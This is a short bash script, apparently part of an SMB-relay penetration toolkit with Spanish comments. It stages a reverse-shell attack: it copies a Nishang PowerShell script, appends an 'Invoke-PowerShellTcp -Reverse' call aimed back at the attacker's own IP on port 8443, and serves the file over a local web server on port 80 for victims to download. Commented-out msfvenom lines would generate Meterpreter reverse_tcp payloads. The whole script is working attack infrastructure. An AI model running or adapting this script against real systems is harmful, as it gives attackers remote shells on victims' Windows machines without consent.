#!/bin/bash

LBlue='\033[0;94m'      # Ligth Blue
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

tput civis
HOST=$(ip route get 1 | awk '{print $7}')
echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Configurando Servidor Web en $HOST ${Color_Off}\n"

#cd archivos
# Copiar Script de Nishan en PowerShell
cp /usr/share/lanscanner/smbrelay/PS.ps1 reverse.ps1
# Agregando parametros al script de Nishang
echo "" >> reverse.ps1
echo "Invoke-PowerShellTcp -Reverse -IPAddress $HOST -Port 8443" >> reverse.ps1

# if [ $arch == "32bits" ] ; then
#     echo "Creando payload de 32 bits"
#     msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=8080 -f psh -o meterpreter.ps1
# fi

# if [ $arch == "64bits" ] ; then
#     echo "Creando payload de 64 bits"
#     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=8443 -f psh -o meterpreter.ps1
# fi

# Levantando servidor web local
python3 -m http.server 80

